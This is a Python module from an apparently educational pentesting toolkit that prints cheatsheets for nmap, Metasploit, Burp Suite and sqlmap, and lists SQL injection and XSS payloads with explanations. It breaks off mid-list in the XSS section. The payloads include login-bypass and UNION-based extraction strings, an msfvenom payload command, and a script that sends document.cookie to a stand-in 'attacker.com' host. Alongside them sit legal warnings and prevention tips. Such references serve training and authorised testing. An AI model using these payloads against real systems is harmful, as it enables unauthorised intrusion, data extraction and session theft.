"""
Command Helper Module for Leegion Framework

This module provides a comprehensive command reference and cheatsheet
for various cybersecurity tools and techniques.
"""

import json
import os
from datetime import datetime
from typing import Any, Dict, List, Set

from core.base_module import BaseModule
from core.banner import print_module_header


class CommandHelper(BaseModule):
    """Command helper with comprehensive cybersecurity tool cheatsheets"""

    def __init__(self, config: Dict[str, Any]):
        super().__init__(config, "Command_Helper")
        self.custom_commands: Dict[str, str] = {}
        self.command_history: List[str] = []
        self.favorites: Set[str] = set()

    def run(self):
        """Main command helper interface"""
        print_module_header(
            "Command Helper", "Cybersecurity Tool Cheatsheets & References"
        )

        while True:
            self._display_helper_menu()
            choice = self.get_user_input("Select option: ")

            if not choice:
                continue

            if choice == "1":
                self._view_tool_cheatsheets()
            elif choice == "2":
                self._search_commands()
            elif choice == "3":
                self._vulnerability_references()
            elif choice == "4":
                self._payload_generators()
            elif choice == "5":
                self._network_references()
            elif choice == "6":
                self._web_application_references()
            elif choice == "7":
                self._custom_command_manager()
            elif choice == "8":
                self._command_favorites()
            elif choice == "9":
                self._quick_reference_cards()
            elif choice == "10":
                self._export_cheatsheets()
            elif choice == "11":
                break
            else:
                self.print_error("Invalid selection. Please try again.")

    def _display_helper_menu(self):
        """Display command helper menu"""
        favorites_count = len(self.favorites)

        print(f"\n\033[93m{'='*65}\033[0m")
        print(f"\033[93m{'COMMAND HELPER MENU'.center(65)}\033[0m")
        print(f"\033[93m{'='*65}\033[0m")
        print(f"\033[96mFavorite Commands:\033[0m {favorites_count}")
        print(
            "\033[93m🎯 BEGINNER TIP:\033[0m Learn these commands hands-on at "
            "\033[92mtryhackme.com\033[0m"
        )
        print(f"\033[93m{'-'*65}\033[0m")
        print("\033[96m 1.\033[0m Tool Cheatsheets")
        print("\033[96m 2.\033[0m Search Commands")
        print("\033[96m 3.\033[0m Vulnerability References")
        print("\033[96m 4.\033[0m Payload Generators")
        print("\033[96m 5.\033[0m Network References")
        print("\033[96m 6.\033[0m Web Application References")
        print("\033[96m 7.\033[0m Custom Command Manager")
        print("\033[96m 8.\033[0m Command Favorites")
        print("\033[96m 9.\033[0m Quick Reference Cards")
        print("\033[96m10.\033[0m Export Cheatsheets")
        print("\033[96m11.\033[0m Back to Main Menu")
        print(f"\033[93m{'='*65}\033[0m")

    def _view_tool_cheatsheets(self):
        """View cheatsheets for various cybersecurity tools"""
        print("\nAvailable tool cheatsheets:")
        tools = [
            "Nmap",
            "Metasploit",
            "Burp Suite",
            "Wireshark",
            "Sqlmap",
            "Nikto",
            "Dirb/Gobuster",
            "Hydra",
            "John the Ripper",
            "Hashcat",
            "Aircrack-ng",
            "Ettercap",
            "tcpdump",
            "OpenSSL",
            "curl/wget",
        ]

        for i, tool in enumerate(tools, 1):
            print(f"\033[96m{i:2d}.\033[0m {tool}")

        choice = self.get_user_input("Select tool (1-15): ")

        tool_methods = {
            "1": self._nmap_cheatsheet,
            "2": self._metasploit_cheatsheet,
            "3": self._burp_cheatsheet,
            "4": self._wireshark_cheatsheet,
            "5": self._sqlmap_cheatsheet,
            "6": self._nikto_cheatsheet,
            "7": self._dirb_gobuster_cheatsheet,
            "8": self._hydra_cheatsheet,
            "9": self._john_cheatsheet,
            "10": self._hashcat_cheatsheet,
            "11": self._aircrack_cheatsheet,
            "12": self._ettercap_cheatsheet,
            "13": self._tcpdump_cheatsheet,
            "14": self._openssl_cheatsheet,
            "15": self._curl_wget_cheatsheet,
        }

        if choice in tool_methods:
            tool_methods[choice]()
        else:
            self.print_error("Invalid tool selection")

    def _search_commands(self):
        """Search for commands by keyword"""
        keyword = self.get_user_input("Enter search keyword: ")
        if not keyword:
            return

        self.print_info(f"Searching for commands containing '{keyword}'...")

        # Search through all cheatsheets
        results = self._search_all_cheatsheets(keyword.lower())

        if results:
            print(f"\n\033[93mFound {len(results)} matching commands:\033[0m")
            for i, result in enumerate(results, 1):
                print(
                    f"\n\033[96m{i}. {result['tool']} - " f"{result['category']}\033[0m"
                )
                print(f"   Command: \033[92m{result['command']}\033[0m")
                print(f"   Description: {result['description']}")

                if i % 5 == 0 and i < len(results):
                    more = self.get_user_input(
                        "Press Enter to continue or 'q' to stop: "
                    )
                    if more and more.lower() == "q":
                        break
        else:
            self.print_warning(f"No commands found for keyword '{keyword}'")

    def _vulnerability_references(self):
        """Display vulnerability references and exploitation techniques"""
        print("\nVulnerability categories:")
        categories = [
            "OWASP Top 10",
            "SQL Injection",
            "XSS (Cross-Site Scripting)",
            "CSRF",
            "Buffer Overflow",
            "Privilege Escalation",
            "Path Traversal",
            "Command Injection",
            "XXE",
            "Insecure Deserialization",
        ]

        for i, category in enumerate(categories, 1):
            print(f"\033[96m{i:2d}.\033[0m {category}")

        choice = self.get_user_input("Select category (1-10): ")

        vuln_methods = {
            "1": self._owasp_top10_reference,
            "2": self._sql_injection_reference,
            "3": self._xss_reference,
            "4": self._csrf_reference,
            "5": self._buffer_overflow_reference,
            "6": self._privilege_escalation_reference,
            "7": self._path_traversal_reference,
            "8": self._command_injection_reference,
            "9": self._xxe_reference,
            "10": self._insecure_deserialization_reference,
        }

        if choice in vuln_methods:
            vuln_methods[choice]()
        else:
            self.print_error("Invalid category selection")

    def _payload_generators(self):
        """Generate various types of payloads"""
        print("\nPayload generator categories:")
        categories = [
            "SQL Injection Payloads",
            "XSS (Cross-Site Scripting) Payloads",
            "Command Injection Payloads",
            "Path Traversal Payloads",
            "LDAP Injection Payloads",
            "XXE Payloads",
        ]

        for i, category in enumerate(categories, 1):
            print(f"\033[96m{i:2d}.\033[0m {category}")

        choice = self.get_user_input("Select category (1-6): ")

        payload_methods = {
            "1": self._generate_sql_payloads,
            "2": self._generate_xss_payloads,
            "3": self._generate_command_injection_payloads,
            "4": self._generate_path_traversal_payloads,
            "5": self._generate_ldap_payloads,
            "6": self._generate_xxe_payloads,
        }

        if choice in payload_methods:
            payload_methods[choice]()
        else:
            self.print_error("Invalid category selection")

    def _network_references(self):
        """Display network security references"""
        print("\nNetwork reference categories:")
        categories = [
            "Port Numbers",
            "Network Reconnaissance",
            "Wireless Security",
            "Network Protocols",
            "Firewall Evasion",
        ]

        for i, category in enumerate(categories, 1):
            print(f"\033[96m{i:2d}.\033[0m {category}")

        choice = self.get_user_input("Select category (1-5): ")

        network_methods = {
            "1": self._port_numbers_reference,
            "2": self._network_recon_reference,
            "3": self._wireless_security_reference,
            "4": self._network_protocols_reference,
            "5": self._firewall_evasion_reference,
        }

        if choice in network_methods:
            network_methods[choice]()
        else:
            self.print_error("Invalid category selection")

    def _web_application_references(self):
        """Display web application security references"""
        print("\nWeb application reference categories:")
        categories = [
            "HTTP Status Codes",
            "HTTP Headers",
            "Web Shells",
            "Reverse Shells",
            "Web Fuzzing",
        ]

        for i, category in enumerate(categories, 1):
            print(f"\033[96m{i:2d}.\033[0m {category}")

        choice = self.get_user_input("Select category (1-5): ")

        web_methods = {
            "1": self._http_status_codes_reference,
            "2": self._http_headers_reference,
            "3": self._web_shells_reference,
            "4": self._reverse_shells_reference,
            "5": self._web_fuzzing_reference,
        }

        if choice in web_methods:
            web_methods[choice]()
        else:
            self.print_error("Invalid category selection")

    def _custom_command_manager(self):
        """Manage custom commands"""
        while True:
            print("\nCustom Command Manager:")
            print("\033[96m1.\033[0m Add Custom Command")
            print("\033[96m2.\033[0m View Custom Commands")
            print("\033[96m3.\033[0m Edit Custom Command")
            print("\033[96m4.\033[0m Delete Custom Command")
            print("\033[96m5.\033[0m Back to Main Menu")

            choice = self.get_user_input("Select option: ")

            if choice == "1":
                self._add_custom_command()
            elif choice == "2":
                self._view_custom_commands()
            elif choice == "3":
                self._edit_custom_command()
            elif choice == "4":
                self._delete_custom_command()
            elif choice == "5":
                break
            else:
                self.print_error("Invalid selection")

    def _command_favorites(self):
        """Manage command favorites"""
        while True:
            print("\nCommand Favorites:")
            print(f"\033[96mTotal Favorites:\033[0m {len(self.favorites)}")
            print("\033[96m1.\033[0m View Favorites")
            print("\033[96m2.\033[0m Add to Favorites")
            print("\033[96m3.\033[0m Remove from Favorites")
            print("\033[96m4.\033[0m Clear All Favorites")
            print("\033[96m5.\033[0m Back to Main Menu")

            choice = self.get_user_input("Select option: ")

            if choice == "1":
                if self.favorites:
                    print("\nFavorite Commands:")
                    for i, fav in enumerate(sorted(self.favorites), 1):
                        print(f"\033[96m{i}.\033[0m {fav}")
                else:
                    self.print_info("No favorite commands yet")
            elif choice == "2":
                command = self.get_user_input("Enter command to add: ")
                if command:
                    self.favorites.add(command)
                    self.print_success(f"Added '{command}' to favorites")
            elif choice == "3":
                if self.favorites:
                    print("\nCurrent favorites:")
                    for i, fav in enumerate(sorted(self.favorites), 1):
                        print(f"\033[96m{i}.\033[0m {fav}")
                    try:
                        user_input = self.get_user_input("Enter number to remove: ")
                        if user_input is None:
                            continue
                        idx = int(user_input) - 1
                        fav_list = sorted(self.favorites)
                        if 0 <= idx < len(fav_list):
                            removed = fav_list[idx]
                            self.favorites.remove(removed)
                            self.print_success(f"Removed '{removed}' from favorites")
                        else:
                            self.print_error("Invalid number")
                    except ValueError:
                        self.print_error("Please enter a valid number")
                else:
                    self.print_info("No favorites to remove")
            elif choice == "4":
                if self.favorites:
                    self.favorites.clear()
                    self.print_success("All favorites cleared")
                else:
                    self.print_info("No favorites to clear")
            elif choice == "5":
                break
            else:
                self.print_error("Invalid selection")

    def _quick_reference_cards(self):
        """Display quick reference cards"""
        print("\nQuick Reference Cards:")
        categories = [
            "Linux Commands",
            "Windows Commands",
            "PowerShell Commands",
            "Bash Scripting",
            "Regular Expressions",
        ]

        for i, category in enumerate(categories, 1):
            print(f"\033[96m{i:2d}.\033[0m {category}")

        choice = self.get_user_input("Select category (1-5): ")

        card_methods = {
            "1": self._linux_commands_card,
            "2": self._windows_commands_card,
            "3": self._powershell_commands_card,
            "4": self._bash_scripting_card,
            "5": self._regex_reference_card,
        }

        if choice in card_methods:
            card_methods[choice]()
        else:
            self.print_error("Invalid category selection")

    def _export_cheatsheets(self):
        """Export cheatsheets to various formats"""
        print("\nExport Cheatsheets:")
        print("\033[96m1.\033[0m Export to JSON")
        print("\033[96m2.\033[0m Export to PDF")
        print("\033[96m3.\033[0m Export to HTML")
        print("\033[96m4.\033[0m Back to Main Menu")

        choice = self.get_user_input("Select option: ")

        if choice == "1":
            self._export_all_cheatsheets_json("./exports", "cheatsheets")
        elif choice == "2":
            self._create_pdf_cheatsheet("./exports", "cheatsheets")
        elif choice == "3":
            html_content = self._generate_comprehensive_cheatsheet_html()
            with open("./exports/cheatsheets.html", "w") as f:
                f.write(html_content)
            self.print_success("HTML cheatsheet exported to ./exports/cheatsheets.html")
        elif choice == "4":
            return
        else:
            self.print_error("Invalid selection")

    # Tool-specific cheatsheet methods
    def _nmap_cheatsheet(self):
        """Enhanced Nmap cheatsheet with educational descriptions"""
        title = "NMAP CHEATSHEET & EDUCATIONAL GUIDE"
        print(f"\n\033[93m{title.center(80)}\033[0m")
        print(f"\033[93m{'='*80}\033[0m")

        print("\n\033[96m📚 WHAT IS NMAP?\033[0m")
        print(
            "Nmap (Network Mapper) is a powerful network discovery and "
            "security auditing tool."
        )
        print(
            "It's used to discover hosts, services, and gather information "
            "about network targets."
        )

        enhanced_commands = {
            "🎯 Basic Scans (Perfect for Beginners)": [
                (
                    "nmap 192.168.1.1",
                    (
                        "Basic port scan - scans top 1000 most common ports\n"
                        "   Best for: Initial reconnaissance of a single target\n"
                        "   Speed: Fast | Stealth: Medium | Info: Basic port "
                        "states\n"
                        "   Example: nmap google.com (finds web servers, "
                        "mail servers)\n"
                        "   Real scenario: CTF box discovery, network asset "
                        "inventory"
                    ),
                ),
                (
                    "nmap -sn 192.168.1.0/24",
                    (
                        "Ping scan (host discovery) - finds live hosts without "
                        "port scanning\n"
                        "   Best for: Discovering which hosts are online in a "
                        "network\n"
                        "   Example: nmap -sn 192.168.1.0/24 → finds\n"
                        "           192.168.1.1, 192.168.1.100, etc.\n"
                        "   Real scenario: Home network audit, office network "
                        "mapping"
                    ),
                ),
                (
                    "nmap -sS 192.168.1.1",
                    (
                        "SYN stealth scan - sends SYN packets without completing "
                        "handshake\n"
                        "   Best for: Stealthy reconnaissance, avoiding logs\n"
                        "   How it works: Sends TCP SYN → receives SYN-ACK → "
                        "sends RST\n"
                        "   Example: nmap -sS target.com (quieter than full "
                        "connection)\n"
                        "   Real scenario: Penetration testing, avoiding IDS "
                        "detection"
                    ),
                ),
                (
                    "nmap -sT 192.168.1.1",
                    (
                        "TCP connect scan - completes full TCP handshake\n"
                        "   Best for: When you don't have administrator/root "
                        "privileges\n"
                        "   Trade-off: More reliable but easier to detect and "
                        "log\n"
                        "   Example: nmap -sT hackthebox.eu (works without "
                        "sudo)\n"
                        "   Real scenario: Scanning from shared hosting, limited "
                        "user accounts"
                    ),
                ),
                (
                    "nmap -p 1-1000 192.168.1.1",
                    (
                        "Scan first 1000 ports (covers most common services)\n"
                        "   Best for: Comprehensive but not exhaustive scanning\n"
                        "   Speed: Medium | Coverage: High for standard "
                        "services"
                    ),
                ),
                (
                    "nmap --top-ports 100 192.168.1.1",
                    (
                        "Scan the 100 most commonly used ports\n"
                        "   Best for: Quick reconnaissance with excellent "
                        "coverage\n"
                        "   Efficiency: Finds 90% of services in minimal time"
                    ),
                ),
                (
                    "nmap -A 192.168.1.1",
                    (
                        "Aggressive scan: OS + version detection + default "
                        "scripts\n"
                        "   Best for: Maximum information in one command\n"
                        "   ⚠️ WARNING: Very noisy, easily detected by security "
                        "systems"
                    ),
                ),
            ],
            "🎯 Smart Port Selection": [
                (
                    "nmap -p 22,80,443 192.168.1.1",
                    (
                        "Scan critical ports: SSH (22), HTTP (80), HTTPS (443)\n"
                        "   Best for: Quick check of essential services\n"
                        "   Use case: Web servers, remote access verification"
                    ),
                ),
                (
                    "nmap -p- 192.168.1.1",
                    (
                        "Scan ALL 65535 ports (comprehensive but slow)\n"
                        "   Best for: CTF challenges, complete discovery\n"
                        "   ⚠️ WARNING: Very slow (hours), may trigger security "
                        "alerts"
                    ),
                ),
                (
                    "nmap -O 192.168.1.1",
                    (
                        "Operating system detection - identifies target OS\n"
                        "   Discovers: Windows 10, Ubuntu 20.04, CentOS 7\n"
                        "   How: Analyzes TCP/IP stack behavior patterns"
                    ),
                ),
                (
                    "nmap -f 192.168.1.1",
                    (
                        "Fragment packets to evade simple firewalls\n"
                        "   Best for: Bypassing basic packet filtering\n"
                        "   How: Splits scan packets into smaller fragments"
                    ),
                ),
                (
                    "nmap -T4 192.168.1.1",
                    (
                        "Aggressive timing - faster but more detectable\n"
                        "   Best for: Internal networks, time-sensitive scanning\n"
                        "   Speed: Fast | Detection risk: Medium-High"
                    ),
                ),
                (
                    "nmap -f 192.168.1.1",
                    (
                        "Fragment packets to evade simple firewalls\n"
                        "   Best for: Bypassing basic packet filtering\n"
                        "   How: Splits scan packets into smaller fragments"
                    ),
                ),
            ],
            "💾 Saving Your Results": [
                (
                    "nmap -oN scan_results.txt 192.168.1.1",
                    (
                        "Save human-readable output to text file\n"
                        "   Best for: Reading results later, including in "
                        "reports\n"
                        "   Format: Same as what you see on screen"
                    ),
                ),
                (
                    "nmap -oX scan_results.xml 192.168.1.1",
                    (
                        "Save XML output for automated processing\n"
                        "   Best for: Importing into other security tools\n"
                        "   Compatible with: Metasploit, Nessus, custom scripts"
                    ),
                ),
                (
                    "nmap -oA complete_scan 192.168.1.1",
                    (
                        "Save in ALL formats (.nmap, .xml, .gnmap)\n"
                        "   Best for: Comprehensive documentation\n"
                        "   Creates: 3 files with different formats for various "
                        "uses"
                    ),
                ),
            ],
        }

        for category, command_list in enhanced_commands.items():
            print(f"\n\033[95m{category}\033[0m")
            print("-" * len(category.encode("ascii", "ignore")))

            for i, (command, description) in enumerate(command_list, 1):
                print(f"\n\033[94m{i}. Command:\033[0m \033[92m{command}\033[0m")
                print(f"\033[93m   {description}\033[0m")

        print("\n\033[96m🎓 BEGINNER'S SCANNING STRATEGY:\033[0m")
        print("1. START: nmap -T3 192.168.1.1 (basic scan)")
        print(
            "2. DISCOVER: nmap -sV -p <found_ports> 192.168.1.1 " "(version detection)"
        )
        print("3. WEB CHECK: nmap --script http-enum -p 80,443 192.168.1.1")
        print("4. VULNERABILITY: nmap --script vuln -p <ports> 192.168.1.1")
        print("5. DOCUMENT: nmap -oA final_scan 192.168.1.1")

        print("\n\033[91m⚠️  CRITICAL LEGAL WARNINGS:\033[0m")
        print("• Only scan networks you own or have explicit written " "permission")
        print("• Port scanning without permission is illegal in many " "jurisdictions")
        print("• Aggressive scans can crash services and cause downtime")
        print("• Always get authorization before testing production systems")

        print("\n\033[96m💡 PRACTICAL EXAMPLES:\033[0m")
        print("• Home network discovery: nmap -sn 192.168.1.0/24")
        print("• Quick web server check: nmap -p 80,443 example.com")
        print("• Comprehensive host scan: nmap -A -T3 192.168.1.100")
        print("• Stealth scan: nmap -sS -T1 -f target.com")

    def _metasploit_cheatsheet(self):
        """Metasploit command cheatsheet"""
        commands = {
            "Basic Commands": [
                ("msfconsole", "Start Metasploit console"),
                ("help", "Show help"),
                ("search <term>", "Search for modules"),
                ("use <module>", "Use a module"),
                ("info", "Show module information"),
                ("back", "Return to main menu"),
            ],
            "Module Management": [
                ("show exploits", "List available exploits"),
                ("show payloads", "List available payloads"),
                ("show auxiliaries", "List auxiliary modules"),
                ("show encoders", "List encoders"),
                ("show nops", "List NOP generators"),
            ],
            "Options & Execution": [
                ("show options", "Show module options"),
                ("set <option> <value>", "Set option value"),
                ("setg <option> <value>", "Set global option"),
                ("unset <option>", "Unset option"),
                ("run", "Execute module"),
                ("exploit", "Execute exploit"),
            ],
            "Payloads": [
                ("set payload <payload>", "Set payload"),
                ("show payloads", "Show compatible payloads"),
                ("generate -f exe -o payload.exe", "Generate standalone payload"),
                (
                    (
                        "msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f exe > "
                        "payload.exe"
                    ),
                    "Generate with msfvenom",
                ),
            ],
            "Sessions": [
                ("sessions -l", "List active sessions"),
                ("sessions -i <id>", "Interact with session"),
                ("sessions -k <id>", "Kill session"),
                ("background", "Background current session"),
            ],
        }

        self._display_cheatsheet("Metasploit", commands)

    def _burp_cheatsheet(self):
        """Burp Suite shortcuts and tips"""
        commands = {
            "Shortcuts": [
                ("Ctrl+Shift+B", "Send to Burp"),
                ("Ctrl+R", "Send to Repeater"),
                ("Ctrl+I", "Send to Intruder"),
                ("Ctrl+Shift+C", "Send to Comparer"),
                ("Ctrl+U", "URL decode"),
                ("Ctrl+Shift+U", "URL encode"),
            ],
            "Proxy": [
                ("Intercept On/Off", "Toggle request interception"),
                ("Forward", "Forward intercepted request"),
                ("Drop", "Drop intercepted request"),
                ("Action > Do active scan", "Start active scan"),
                ("Action > Spider this host", "Start spider"),
            ],
            "Repeater": [
                ("Go", "Send request"),
                ("Ctrl+Space", "Auto-complete"),
                ("Ctrl+U", "URL decode selection"),
                ("Ctrl+Shift+U", "URL encode selection"),
                ("Ctrl+H", "Base64 decode"),
            ],
            "Intruder": [
                ("Add §", "Add payload position"),
                ("Clear §", "Clear payload positions"),
                ("Sniper", "Single payload set"),
                ("Battering ram", "Single payload to all positions"),
                ("Pitchfork", "Multiple payload sets (parallel)"),
                ("Cluster bomb", "Multiple payload sets (cartesian)"),
            ],
        }

        self._display_cheatsheet("Burp Suite", commands)

    def _sqlmap_cheatsheet(self):
        """SQLMap command cheatsheet"""
        commands = {
            "Basic Usage": [
                ("sqlmap -u '<url>'", "Basic SQL injection test"),
                ("sqlmap -u '<url>' --dbs", "Enumerate databases"),
                ("sqlmap -u '<url>' -D <db> --tables", "Enumerate tables"),
                ("sqlmap -u '<url>' -D <db> -T <table> --columns", "Enumerate columns"),
                ("sqlmap -u '<url>' -D <db> -T <table> -C <col> --dump", "Dump data"),
            ],
            "Request Options": [
                ("--cookie='JSESSIONID=...'", "Use cookies"),
                ("--user-agent='...'", "Custom user agent"),
                ("--referer='...'", "Custom referer"),
                ("--headers='X-Forwarded-For: 127.0.0.1'", "Custom headers"),
                ("--method=POST", "Use POST method"),
                ("--data='param=value'", "POST data"),
            ],
            "Detection Options": [
                ("--level=5", "Test level (1-5)"),
                ("--risk=3", "Risk level (1-3)"),
                ("--technique=BEUST", "SQL injection techniques"),
                ("--dbms=mysql", "Force DBMS type"),
                ("--os=linux", "Force OS type"),
            ],
            "Advanced Features": [
                ("--batch", "Non-interactive mode"),
                ("--random-agent", "Use random user agent"),
                ("--proxy=http://127.0.0.1:8080", "Use proxy"),
                ("--tor", "Use Tor network"),
                ("--check-tor", "Check Tor connection"),
                ("--flush-session", "Flush session files"),
            ],
        }

        self._display_cheatsheet("SQLMap", commands)

    def _generate_sql_payloads(self):
        """Generate SQL injection payloads with educational descriptions"""
        print(
            f"\n\033[93m"
            f"{'SQL INJECTION PAYLOADS & EDUCATIONAL GUIDE'.center(80)}"
            f"\033[0m"
        )
        print(f"\033[93m{'='*80}\033[0m")

        print("\n\033[96m📚 WHAT IS SQL INJECTION?\033[0m")
        print(
            "SQL injection occurs when user input is not properly sanitized "
            "before being used in SQL queries, allowing attackers to manipulate "
            "database operations."
        )

        payloads_with_descriptions = {
            "🎯 Basic Authentication Bypass": [
                (
                    "' OR '1'='1",
                    (
                        "Classic bypass - makes condition always true\n"
                        "   Use: Login forms, search boxes\n"
                        "   How: Breaks out of quotes and adds always-true condition\n"
                        "   Example: Username: admin' OR '1'='1 | Password: anything\n"
                        "   Real scenario: Admin panels, customer portals, "
                        "database interfaces"
                    ),
                ),
                (
                    "' OR 1=1--",
                    (
                        "Same as above but uses SQL comment (--) to ignore rest\n"
                        "   Use: When there's additional SQL code after injection "
                        "point\n"
                        "   How: Comments out password check or other conditions\n"
                        "   Example: Login query becomes: WHERE user='admin' OR 1=1-- "
                        "AND pass='...\n"
                        "   Real scenario: Legacy applications, custom authentication "
                        "systems"
                    ),
                ),
                (
                    "admin'--",
                    (
                        "Assumes username 'admin' exists, ignores password\n"
                        "   Use: When you know a valid username\n"
                        "   How: Closes username quote and comments out password check\n"
                        "   Example: Username: admin'-- | Password: (ignored)\n"
                        "   Real scenario: WordPress admin, CMS backends, database tools"
                    ),
                ),
                (
                    "') OR '1'='1",
                    (
                        "For queries using parentheses around conditions\n"
                        "   Use: When original query has complex WHERE clauses\n"
                        "   How: Closes parentheses before adding bypass condition\n"
                        "   Example: WHERE (username='user' AND active=1) becomes "
                        "(username='user') OR '1'='1\n"
                        "   Real scenario: Enterprise applications, multi-condition "
                        "authentication"
                    ),
                ),
            ],
            "🔍 Union-Based SQL Injection (Data Extraction)": [
                (
                    "' UNION SELECT 1,2,3--",
                    (
                        "Determines number of columns in original query\n"
                        "   Use: First step in UNION attacks\n"
                        "   How: Tests if 3 columns exist; adjust numbers until no error\n"
                        "   Example: Search box → product' UNION SELECT 1,2,3-- \n"
                        "   Real scenario: E-commerce product search, news article lookup"
                    ),
                ),
                (
                    "' UNION SELECT user(),database(),version()--",
                    (
                        "Extracts database username, name, and version\n"
                        "   Use: Gathering system information\n"
                        "   How: Uses MySQL functions to get server details\n"
                        "   Example: Returns → root@localhost, shop_db, MySQL 5.7.3\n"
                        "   Real scenario: Fingerprinting database for targeted attacks"
                    ),
                ),
                (
                    (
                        "' UNION SELECT 1,group_concat(table_name),3 FROM "
                        "information_schema.tables--"
                    ),
                    (
                        "Lists all table names in the database\n"
                        "   Use: Finding interesting tables to target\n"
                        "   How: Queries information_schema (MySQL's metadata tables)\n"
                        "   Example: Returns → users,orders,products,admin_logs,"
                        "payment_info\n"
                        "   Real scenario: Finding sensitive data tables like credit "
                        "cards"
                    ),
                ),
                (
                    (
                        "' UNION SELECT 1,group_concat(column_name),3 FROM "
                        "information_schema.columns WHERE table_name='users'--"
                    ),
                    (
                        "Lists column names in 'users' table\n"
                        "   Use: Finding username/password column names\n"
                        "   How: Targets specific table to understand its structure\n"
                        "   Example: Returns → id,username,email,password_hash,is_admin\n"
                        "   Real scenario: Preparing to extract user credentials"
                    ),
                ),
            ],
            "⏱️ Time-Based Blind SQL Injection": [
                (
                    "' OR SLEEP(5)--",
                    (
                        "MySQL: Causes 5-second delay if injection works\n"
                        "   Use: When you can't see query results directly\n"
                        "   How: If page loads 5 seconds slower, injection succeeded\n"
                        "   Example: Login form → username: admin' OR SLEEP(5)-- \n"
                        "   Real scenario: Testing if vulnerable when error messages "
                        "hidden"
                    ),
                ),
                (
                    "'; WAITFOR DELAY '00:00:05'--",
                    (
                        "SQL Server: Same as SLEEP but for Microsoft SQL Server\n"
                        "   Use: When targeting Windows/MSSQL environments\n"
                        "   How: Waits 5 seconds before continuing execution\n"
                        "   Example: Search → query'; WAITFOR DELAY '00:00:05'-- \n"
                        "   Real scenario: Corporate intranets running Windows Server"
                    ),
                ),
                (
                    "'; SELECT pg_sleep(5)--",
                    (
                        "PostgreSQL: Delay function for PostgreSQL databases\n"
                        "   Use: When targeting PostgreSQL servers\n"
                        "   How: PostgreSQL-specific sleep function\n"
                        "   Example: ID parameter → ?id=1'; SELECT pg_sleep(5)-- \n"
                        "   Real scenario: Modern web apps using PostgreSQL"
                    ),
                ),
                (
                    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                    (
                        "Advanced MySQL delay using subquery\n"
                        "   Use: When simple SLEEP() is filtered\n"
                        "   How: Bypasses some WAF filters by using subquery structure\n"
                        "   Example: Bypasses ModSecurity rules blocking SLEEP()\n"
                        "   Real scenario: Applications with Web Application Firewalls"
                    ),
                ),
            ],
            "✅ Boolean-Based Blind SQL Injection": [
                (
                    "' AND 1=1--",
                    (
                        "Always true condition - should return normal results\n"
                        "   Use: Testing if blind injection works\n"
                        "   How: If page looks normal, injection point exists"
                    ),
                ),
                (
                    "' AND 1=2--",
                    (
                        "Always false condition - should return no/different results\n"
                        "   Use: Confirming blind injection by comparing with 1=1\n"
                        "   How: If page differs from 1=1 test, you have blind injection"
                    ),
                ),
                (
                    "' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
                    (
                        "Tests if database version starts with '5' (MySQL 5.x)\n"
                        "   Use: Fingerprinting database version\n"
                        "   How: Change number to identify exact version"
                    ),
                ),
                (
                    "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                    (
                        "Tests if information_schema exists (confirms MySQL/PostgreSQL)\n"
                        "   Use: Database fingerprinting\n"
                        "   How: Only MySQL and PostgreSQL have information_schema"
                    ),
                ),
            ],
        }

        for category, payload_list in payloads_with_descriptions.items():
            print(f"\n\033[95m{category}\033[0m")
            print("-" * len(category.encode("ascii", "ignore")))

            for i, (payload, description) in enumerate(payload_list, 1):
                print(f"\n\033[94m{i}. Payload:\033[0m \033[92m{payload}\033[0m")
                print(f"\033[93m   Description:\033[0m {description}")

        print("\n\033[91m⚠️  IMPORTANT SAFETY NOTES:\033[0m")
        print("• Only test on systems you own or have explicit permission to test")
        print("• SQL injection can cause data loss - always backup before testing")
        print("• Start with safe payloads (1=1) before attempting data extraction")
        print(
            "• Use these payloads in CTF environments and authorized penetration "
            "tests"
        )

        print("\n\033[96m🛡️  PREVENTION FOR DEVELOPERS:\033[0m")
        print("• Use parameterized queries/prepared statements")
        print("• Validate and sanitize all user input")
        print("• Use least-privilege database accounts")
        print("• Implement proper error handling (don't show SQL errors to users)")

    def _generate_xss_payloads(self):
        """Generate XSS payloads with educational descriptions"""
        print(
            f"\n\033[93m{'CROSS-SITE SCRIPTING (XSS) PAYLOADS & EDUCATIONAL GUIDE'.center(80)}\033[0m"
        )
        print(f"\033[93m{'='*80}\033[0m")

        print("\n\033[96m📚 WHAT IS XSS (CROSS-SITE SCRIPTING)?\033[0m")
        print(
            "XSS allows attackers to inject malicious scripts into web pages viewed "
            "by other users. The scripts execute in victims' browsers with site "
            "privileges."
        )

        payloads_with_descriptions = {
            "🎯 Basic XSS Payloads (Start Here)": [
                (
                    "<script>alert('XSS')</script>",
                    (
                        "Classic JavaScript execution test\n"
                        "   Use: Testing if XSS is possible at all\n"
                        "   How: Injects JavaScript that shows alert popup\n"
                        "   Example: Search box, comment forms, user profiles\n"
                        "   Real scenario: Testing input validation on web forms"
                    ),
                ),
                (
                    "<img src=x onerror=alert('XSS')>",
                    (
                        "Image tag with error handler - bypasses script tag filters\n"
                        "   Use: When <script> tags are blocked\n"
                        "   How: Invalid image src triggers onerror event\n"
                        "   Example: Profile picture upload, image galleries\n"
                        "   Real scenario: Bypassing WAF rules that block script tags"
                    ),
                ),
                (
                    "javascript:alert('XSS')",
                    (
                        "JavaScript protocol in href attributes\n"
                        "   Use: In link href attributes\n"
                        "   How: Executes JavaScript when link is clicked\n"
                        "   Example: User profile links, navigation menus\n"
                        "   Real scenario: Social media profile links, user-generated content"
                    ),
                ),
                (
                    "<svg onload=alert('XSS')>",
                    (
                        "SVG with onload event - modern XSS technique\n"
                        "   Use: When traditional methods are filtered\n"
                        "   How: SVG onload event executes when image loads\n"
                        "   Example: Image uploads, avatar systems\n"
                        "   Real scenario: Modern web applications with SVG support"
                    ),
                ),
            ],
            "🔍 Reflected XSS (Non-Persistent)": [
                (
                    "<script>alert(document.cookie)</script>",
                    (
                        "Steals user cookies - most common XSS attack\n"
                        "   Use: When you want to steal session data\n"
                        "   How: Accesses browser's cookie storage\n"
                        "   Example: Search results, error messages, URL parameters\n"
                        "   Real scenario: Stealing admin sessions, user authentication"
                    ),
                ),
                (
                    "<script>fetch('http://attacker.com?cookie='+document.cookie)</script>",
                    (
                        "Sends stolen cookies to attacker's server\n"
                        "   Use: When you control a server to receive stolen data\n"
                        "   How: Makes HTTP request with stolen cookies\n"
                        "   Example: Advanced cookie theft for session hijacking\n"
                        "   Real scenario: Professional penetration testing, red teaming"
                    ),
                ),
                (
